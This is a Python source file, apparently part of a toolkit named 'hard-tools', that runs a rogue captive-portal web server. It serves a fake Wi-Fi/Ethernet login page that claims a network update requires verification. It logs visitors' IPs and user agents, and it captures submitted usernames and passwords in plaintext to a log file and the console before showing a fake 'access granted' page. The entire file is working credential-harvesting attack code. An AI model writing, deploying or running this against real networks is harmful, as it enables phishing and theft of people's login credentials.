#!/usr/bin/env python3
"""
hard-tools: lib/rogue_portal.py
Rogue Captive Portal & Credential Interception HTTP Server
"""

import http.server
import socketserver
import urllib.parse
import sys
import os
import datetime

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 80
LOG_FILE = "/tmp/badusb_credentials.log"

HTML_TEMPLATE = """<!DOCTYPE html>
<html>
<head>
    <title>Network Authentication Required</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #0f172a; color: #f8fafc; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: #1e293b; padding: 2.5rem; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); width: 100%; max-width: 400px; text-align: center; }
        h2 { margin-bottom: 0.5rem; color: #38bdf8; }
        p { color: #94a3b8; font-size: 0.9rem; margin-bottom: 1.5rem; }
        input { width: 100%; padding: 0.75rem; margin-bottom: 1rem; border: 1px solid #334155; border-radius: 6px; background: #0f172a; color: #fff; box-sizing: border-box; }
        button { width: 100%; padding: 0.75rem; background: #0284c7; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 1rem; }
        button:hover { background: #0369a1; }
        .badge { display: inline-block; background: #0369a1; padding: 4px 8px; border-radius: 4px; font-size: 0.75rem; margin-bottom: 1rem; }
    </style>
</head>
<body>
    <div class="card">
        <div class="badge">HARD-TOOLS ROGUE GATEWAY</div>
        <h2>Wi-Fi / Ethernet Login</h2>
        <p>A network update requires login verification to grant internet access.</p>
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="Username / Email" required autocomplete="off">
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Authorize Connection</button>
        </form>
    </div>
</body>
</html>
"""

SUCCESS_TEMPLATE = """<!DOCTYPE html>
<html>
<head><title>Access Granted</title><style>body { background: #0f172a; color: #22c55e; font-family: sans-serif; text-align: center; padding-top: 20%; }</style></head>
<body><h1>✔ Connection Authenticated</h1><p>Internet access has been granted.</p></body></html>
"""

class PortalHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        # Silence default stderr logging
        pass

    def do_GET(self):
        # Redirect all paths to root captive portal
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write(HTML_TEMPLATE.encode('utf-8'))
        
        # Log client visit
        now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        ua = self.headers.get('User-Agent', 'Unknown')
        entry = f"[{now}] GET {self.path} from {self.client_address[0]} (UA: {ua})\n"
        with open(LOG_FILE, 'a') as f:
            f.write(entry)
        print(f"[*] Probe from {self.client_address[0]} -> {self.path}")

    def do_POST(self):
        content_len = int(self.headers.get('Content-Length', 0))
        post_body = self.rfile.read(content_len).decode('utf-8', errors='ignore')
        parsed = urllib.parse.parse_qs(post_body)
        
        user = parsed.get('username', [''])[0]
        passwd = parsed.get('password', [''])[0]

        now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        entry = f"[{now}] CREDENTIALS CAPTURED: User='{user}' Pass='{passwd}' IP={self.client_address[0]}\n"
        with open(LOG_FILE, 'a') as f:
            f.write(entry)

        print(f"\n\033[1;32m[+] CREDENTIAL CAPTURED!\033[0m User: {user} | Pass: {passwd} (from {self.client_address[0]})\n")

        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write(SUCCESS_TEMPLATE.encode('utf-8'))

if __name__ == "__main__":
    with socketserver.TCPServer(("", PORT), PortalHandler) as httpd:
        print(f"[*] Rogue Captive Portal listening on port {PORT}...")
        httpd.serve_forever()
